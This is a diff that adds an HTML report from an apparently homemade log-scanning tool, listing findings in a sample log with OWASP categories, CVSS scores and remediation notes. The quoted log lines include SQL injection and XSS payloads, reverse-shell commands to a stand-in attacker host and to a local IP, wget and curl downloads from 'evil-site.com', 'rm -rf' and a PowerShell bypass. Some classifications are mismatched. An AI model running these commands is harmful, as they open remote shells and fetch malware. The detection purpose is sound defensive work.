@@ -1,0 +1,617 @@
+
+<!DOCTYPE html>
+
+<html>
+<head>
+    <meta charset="UTF-8">
+
+    <title>sample_log.txt Security Details</title>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 30px;
+            background: #f8fafc;
+            color: #111827;
+        }
+
+        .header {
+            background: #1f2937;
+            color: white;
+            padding: 24px;
+            border-radius: 10px;
+            margin-bottom: 25px;
+        }
+
+        .header p {
+            word-break: break-all;
+            color: #cbd5e1;
+        }
+
+        .metrics-grid {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+
+        .metric-card {
+            min-width: 170px;
+            background: white;
+            border: 1px solid #d1d5db;
+            border-radius: 10px;
+            padding: 18px;
+        }
+
+        .metric-card strong {
+            display: block;
+            margin-bottom: 8px;
+            color: #4b5563;
+        }
+
+        .metric-card span {
+            font-size: 26px;
+            font-weight: bold;
+        }
+
+        .severity-high {
+            border-left: 5px solid #dc2626;
+        }
+
+        .severity-medium {
+            border-left: 5px solid #f59e0b;
+        }
+
+        .severity-low {
+            border-left: 5px solid #16a34a;
+        }
+
+        .category-card {
+            background: white;
+            border: 1px solid #d1d5db;
+            border-radius: 10px;
+            padding: 18px;
+            margin-bottom: 25px;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            background: white;
+        }
+
+        th,
+        td {
+            border: 1px solid #d1d5db;
+            padding: 10px;
+            text-align: left;
+            vertical-align: top;
+        }
+
+        th {
+            background: #e5e7eb;
+        }
+
+        .back-link {
+            display: inline-block;
+            margin-bottom: 20px;
+            color: #2563eb;
+            font-weight: bold;
+            text-decoration: none;
+        }
+
+        .back-link:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+
+<a class="back-link" href="../scan_report_2026-07-23_08-57-51.html">
+    ← Back to Secure Scan Report
+</a>
+
+<div class="header">
+    <h1>sample_log.txt</h1>
+    <p>/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt</p>
+</div>
+
+<div class="metrics-grid">
+    <div class="metric-card">
+        <strong>Total Findings</strong>
+        <span>43</span>
+    </div>
+
+    <div class="metric-card">
+        <strong>Risk Score</strong>
+        <span>341</span>
+    </div>
+
+    <div class="metric-card">
+        <strong>Highest Severity</strong>
+        <span>HIGH</span>
+    </div>
+
+    <div class="metric-card">
+        <strong>Average CVSS</strong>
+        <span>6.55</span>
+    </div>
+
+    <div class="metric-card">
+        <strong>Highest CVSS</strong>
+        <span>10.0</span>
+    </div>
+
+    <div class="metric-card severity-high">
+        <strong>HIGH</strong>
+        <span>30</span>
+    </div>
+
+    <div class="metric-card severity-medium">
+        <strong>MEDIUM</strong>
+        <span>7</span>
+    </div>
+
+    <div class="metric-card severity-low">
+        <strong>LOW</strong>
+        <span>6</span>
+    </div>
+</div>
+
+<div class="category-card">
+    <h2>OWASP Categories</h2>
+
+    <ul>
+        <li>A01: Broken Access Control</li><li>A02: Cryptographic Failures</li><li>A03: Injection</li><li>A05: Security Misconfiguration</li><li>A07: Identification and Authentication Failures</li><li>A08: Software and Data Integrity Failures</li>
+    </ul>
+</div>
+
+<h2>Findings</h2>
+
+<table>
+    <tr>
+        <th>Finding</th>
+        <th>Severity</th>
+        <th>OWASP</th>
+        <th>CVSS</th>
+        <th>Line</th>
+        <th>Content</th>
+        <th>Recommended Action</th>
+    </tr>
+
+    
+            <tr>
+                <td>sql_injection_payload</td>
+                <td>HIGH</td>
+                <td>A03: Injection</td>
+                <td>9.8</td>
+                <td>3</td>
+                <td>ERROR SQL injection attempt detected: &#x27; OR 1=1 --</td>
+                <td>Use parameterized queries.</td>
+            </tr>
+            
+            <tr>
+                <td>github_token</td>
+                <td>HIGH</td>
+                <td>A02: Cryptographic Failures</td>
+                <td>9.0</td>
+                <td>5</td>
+                <td>WARN admin token exposed: ghp_exampletoken</td>
+                <td>Remove token and rotate credentials.</td>
+            </tr>
+            
+            <tr>
+                <td>password</td>
+                <td>HIGH</td>
+                <td>A02: Cryptographic Failures</td>
+                <td>8.0</td>
+                <td>10</td>
+                <td>admin password is secret</td>
+                <td>Review finding and remediate appropriately.</td>
+            </tr>
+            
+            <tr>
+                <td>password_assignment</td>
+                <td>HIGH</td>
+                <td>A07: Identification and Authentication Failures</td>
+                <td>8.5</td>
+                <td>11</td>
+                <td>password=12345</td>
+                <td>Review finding and remediate appropriately.</td>
+            </tr>
+            
+            <tr>
+                <td>weak_password</td>
+                <td>HIGH</td>
+                <td>A07: Identification and Authentication Failures</td>
+                <td>6.5</td>
+                <td>12</td>
+                <td>INFO AWS key found: AKIA1234567890ABCDE</td>
+                <td>Enforce strong password policies.</td>
+            </tr>
+            
+            <tr>
+                <td>weak_password</td>
+                <td>HIGH</td>
+                <td>A07: Identification and Authentication Failures</td>
+                <td>6.5</td>
+                <td>13</td>
+                <td>AWS key leaked: AKIA1234567890ABCDEF</td>
+                <td>Enforce strong password policies.</td>
+            </tr>
+            
+            <tr>
+                <td>github_token</td>
+                <td>HIGH</td>
+                <td>A02: Cryptographic Failures</td>
+                <td>9.0</td>
+                <td>17</td>
+                <td>GitHub token leaked: ghp_abcdefghijklmnoprstuvwxyz123</td>
+                <td>Remove token and rotate credentials.</td>
+            </tr>
+            
+            <tr>
+                <td>sql_injection_payload</td>
+                <td>HIGH</td>
+                <td>A03: Injection</td>
+                <td>9.8</td>
+                <td>18</td>
+                <td>WARN Login attempt username=admin&#x27; OR 1=1 --</td>
+                <td>Use parameterized queries.</td>
+            </tr>
+            
+            <tr>
+                <td>password</td>
+                <td>HIGH</td>
+                <td>A02: Cryptographic Failures</td>
+                <td>8.0</td>
+                <td>19</td>
+                <td>WARN SQL attack detected: UNION SELECT password FROM users</td>
+                <td>Review finding and remediate appropriately.</td>
+            </tr>
+            
+            <tr>
+                <td>sql_injection_payload</td>
+                <td>HIGH</td>
+                <td>A03: Injection</td>
+                <td>9.8</td>
+                <td>21</td>
+                <td>WARN BODY exploit: &lt;body onload=alert(&#x27;xss&#x27;)&gt;</td>
+                <td>Use parameterized queries.</td>
+            </tr>
+            
+            <tr>
+                <td>weak_password</td>
+                <td>HIGH</td>
+                <td>A07: Identification and Authentication Failures</td>
+                <td>6.5</td>
+                <td>22</td>
+                <td>WARN Weak_password detected: password123</td>
+                <td>Enforce strong password policies.</td>
+            </tr>
+            
+            <tr>
+                <td>weak_password</td>
+                <td>HIGH</td>
+                <td>A07: Identification and Authentication Failures</td>
+                <td>6.5</td>
+                <td>23</td>
+                <td>WARN Admin login using admin123</td>
+                <td>Enforce strong password policies.</td>
+            </tr>
+            
+            <tr>
+                <td>admin_endpoint</td>
+                <td>HIGH</td>
+                <td>A01: Broken Access Control</td>
+                <td>5.0</td>
+                <td>24</td>
+                <td>WARN Admin endpoint accessed: /admin/dashboard</td>
+                <td>Review finding and remediate appropriately.</td>
+            </tr>
+            
+            <tr>
+                <td>os_system_usage</td>
+                <td>HIGH</td>
+                <td>A05: Security Misconfiguration</td>
+                <td>5.0</td>
+                <td>27</td>
+                <td>WARN Shell execution detection: os.system(cmd)</td>
+                <td>Review finding and remediate appropriately.</td>
+            </tr>
+            
+            <tr>
+                <td>download_activity</td>
+                <td>HIGH</td>
+                <td>A05: Security Misconfiguration</td>
+                <td>9.0</td>
+                <td>31</td>
+                <td>WARN wget http://evil-site.com/backdoor.sh</td>
+                <td>Validate download source and block malicious URLs.</td>
+            </tr>
+            
+            <tr>
+                <td>reverse_shell</td>
+                <td>HIGH</td>
+                <td>A03: Injection</td>
+                <td>10.0</td>
+                <td>32</td>
+                <td>WARN nc -e /bin/sh attacker.com 4444</td>
+                <td>Investigate for malware and isolate host.</td>
+            </tr>
+            
+            <tr>
+                <td>os_system_usage</td>
+                <td>HIGH</td>
+                <td>A05: Security Misconfiguration</td>
+                <td>5.0</td>
+                <td>33</td>
+                <td>WARN Shell execution detected: os.system(&quot;rm -rf&quot;)</td>
+                <td>Review finding and remediate appropriately.</td>
+            </tr>
+            
+            <tr>
+                <td>admin_endpoint</td>
+                <td>HIGH</td>
+                <td>A01: Broken Access Control</td>
+                <td>5.0</td>
+                <td>36</td>
+                <td>WARN admin_access attempt to /admin/users</td>
+                <td>Review finding and remediate appropriately.</td>
+            </tr>
+            
+            <tr>
+                <td>sql_injection_payload</td>
+                <td>HIGH</td>
+                <td>A03: Injection</td>
+                <td>9.8</td>
+                <td>37</td>
+                <td>ERROR XSS payload: javascript:alert(&#x27;owned&#x27;)</td>
+                <td>Use parameterized queries.</td>
+            </tr>
+            
+            <tr>
+                <td>weak_password</td>
+                <td>HIGH</td>
+                <td>A07: Identification and Authentication Failures</td>
+                <td>6.5</td>
+                <td>38</td>
+                <td>ERROR User account using qwerty password</td>
+                <td>Enforce strong password policies.</td>
+            </tr>
+            
+            <tr>
+                <td>default_credentials</td>
+                <td>HIGH</td>
+                <td>A05: Security Misconfiguration</td>
+                <td>5.0</td>
+                <td>40</td>
+                <td>ERROR Default credentials detected admin:admin</td>
+                <td>Review finding and remediate appropriately.</td>
+            </tr>
+            
+            <tr>
+                <td>sql_injection_payload</td>
+                <td>HIGH</td>
+                <td>A03: Injection</td>
+                <td>9.8</td>
+                <td>41</td>
+                <td>ERROR Possible login bypass attempt: &#x27; OR 1=1 --</td>
+                <td>Use parameterized queries.</td>
+            </tr>
+            
+            <tr>
+                <td>pickle_loads</td>
+                <td>HIGH</td>
+                <td>A08: Software and Data Integrity Failures</td>
+                <td>5.0</td>
+                <td>42</td>
+                <td>ERROR Unsafe deserialization: pickle.loads(user_data)</td>
+                <td>Review finding and remediate appropriately.</td>
+            </tr>
+            
+            <tr>
+                <td>sql_injection_payload</td>
+                <td>HIGH</td>
+                <td>A03: Injection</td>
+                <td>9.8</td>
+                <td>43</td>
+                <td>ERROR SQL injection attempt detected: &#x27; OR 1=1 --</td>
+                <td>Use parameterized queries.</td>
+            </tr>
+            
+            <tr>
+                <td>sql_injection_payload</td>
+                <td>HIGH</td>
+                <td>A03: Injection</td>
+                <td>9.8</td>
+                <td>45</td>
+                <td>ERROR sql_injection_payload detected: &#x27; OR 1=1 --</td>
+                <td>Use parameterized queries.</td>
+            </tr>
+            
+            <tr>
+                <td>eval_usage</td>
+                <td>HIGH</td>
+                <td>A03: Injection</td>
+                <td>5.0</td>
+                <td>46</td>
+                <td>CRITICAL Dangerous eval detected: eval(user_input)</td>
+                <td>Review finding and remediate appropriately.</td>
+            </tr>
+            
+            <tr>
+                <td>powershell</td>
+                <td>HIGH</td>
+                <td>A05: Security Misconfiguration</td>
+                <td>9.5</td>
+                <td>47</td>
+                <td>ALERT powershell.exe -ExecutionPolicy Bypass</td>
+                <td>Review command and restrict execution policy.</td>
+            </tr>
+            
+            <tr>
+                <td>download_activity</td>
+                <td>HIGH</td>
+                <td>A05: Security Misconfiguration</td>
+                <td>9.0</td>
+                <td>48</td>
+                <td>ALERT curl http://evil-site.com/malware.exe</td>
+                <td>Validate download source and block malicious URLs.</td>
+            </tr>
+            
+            <tr>
+                <td>token</td>
+                <td>HIGH</td>
+                <td>A02: Cryptographic Failures</td>
+                <td>5.0</td>
+                <td>50</td>
+                <td>ALERT github_token found in config</td>
+                <td>Review finding and remediate appropriately.</td>
+            </tr>
+            
+            <tr>
+                <td>powershell</td>
+                <td>HIGH</td>
+                <td>A05: Security Misconfiguration</td>
+                <td>9.5</td>
+                <td>51</td>
+                <td>ALERT powershell execution detection</td>
+                <td>Review command and restrict execution policy.</td>
+            </tr>
+            
+            <tr>
+                <td>xss</td>
+                <td>MEDIUM</td>
+                <td>A03: Injection</td>
+                <td>5.0</td>
+                <td>6</td>
+                <td>ERROR XSS payload: &lt;script&gt;alert(1)&lt;/script&gt;</td>
+                <td>Review finding and remediate appropriately.</td>
+            </tr>
+            
+            <tr>
+                <td>hardcore_login</td>
+                <td>MEDIUM</td>
+                <td>A07: Identification and Authentication Failures</td>
+                <td>5.0</td>
+                <td>15</td>
+                <td>INFO username=&quot;test_user&quot;</td>
+                <td>Review finding and remediate appropriately.</td>
+            </tr>
+            
+            <tr>
+                <td>xss</td>
+                <td>MEDIUM</td>
+                <td>A03: Injection</td>
+                <td>5.0</td>
+                <td>20</td>
+                <td>WARN IMG exploit: &lt;img src=x onerror=alert(1)&gt;</td>
+                <td>Review finding and remediate appropriately.</td>
+            </tr>
+            
+            <tr>
+                <td>debug_endpoint</td>
+                <td>MEDIUM</td>
+                <td>A05: Security Misconfiguration</td>
+                <td>5.0</td>
+                <td>25</td>
+                <td>WARN Debug endpoint exposed: /debug/config</td>
+                <td>Review finding and remediate appropriately.</td>
+            </tr>
+            
+            <tr>
+                <td>admin</td>
+                <td>MEDIUM</td>
+                <td>A01: Broken Access Control</td>
+                <td>5.0</td>
+                <td>34</td>
+                <td>WARN User attempt access to admin_panel</td>
+                <td>Review finding and remediate appropriately.</td>
+            </tr>
+            
+            <tr>
+                <td>admin</td>
+                <td>MEDIUM</td>
+                <td>A01: Broken Access Control</td>
+                <td>5.0</td>
+                <td>35</td>
+                <td>WARN Unauthorized access to admin_panel</td>
+                <td>Review finding and remediate appropriately.</td>
+            </tr>
+            
+            <tr>
+                <td>xss</td>
+                <td>MEDIUM</td>
+                <td>A03: Injection</td>
+                <td>5.0</td>
+                <td>44</td>
+                <td>ERROR XSS payload: &lt;script&gt;alert(1)&lt;/script&gt;</td>
+                <td>Review finding and remediate appropriately.</td>
+            </tr>
+            
+            <tr>
+                <td>ip_address</td>
+                <td>LOW</td>
+                <td>A05: Security Misconfiguration</td>
+                <td>2.0</td>
+                <td>1</td>
+                <td>INFO User login success user=alice ip=10.0.0.5</td>
+                <td>Review finding and remediate appropriately.</td>
+            </tr>
+            
+            <tr>
+                <td>ip_address</td>
+                <td>LOW</td>
+                <td>A05: Security Misconfiguration</td>
+                <td>2.0</td>
+                <td>2</td>
+                <td>WARN Failed password attempt user=bob ip=10.0.0.9</td>
+                <td>Review finding and remediate appropriately.</td>
+            </tr>
+            
+            <tr>
+                <td>email</td>
+                <td>LOW</td>
+                <td>A02: Cryptographic Failures</td>
+                <td>3.0</td>
+                <td>8</td>
+                <td>INFO Contact admin@test.com immediately</td>
+                <td>Review finding and remediate appropriately.</td>
+            </tr>
+            
+            <tr>
+                <td>api_endpoint</td>
+                <td>LOW</td>
+                <td>A05: Security Misconfiguration</td>
+                <td>5.0</td>
+                <td>9</td>
+                <td>INFO Request made to /api/users/profile</td>
+                <td>Review finding and remediate appropriately.</td>
+            </tr>
+            
+            <tr>
+                <td>ip_address</td>
+                <td>LOW</td>
+                <td>A05: Security Misconfiguration</td>
+                <td>2.0</td>
+                <td>14</td>
+                <td>INFO Suspicious login from 192.168.1.25</td>
+                <td>Review finding and remediate appropriately.</td>
+            </tr>
+            
+            <tr>
+                <td>ip_address</td>
+                <td>LOW</td>
+                <td>A05: Security Misconfiguration</td>
+                <td>2.0</td>
+                <td>49</td>
+                <td>ALERT bash -i &gt;&amp; /dev/tcp/10.0.0.5/4444 0&gt;&amp;1</td>
+                <td>Review finding and remediate appropriately.</td>
+            </tr>
+            
+</table>
+
+</body>
+</html>
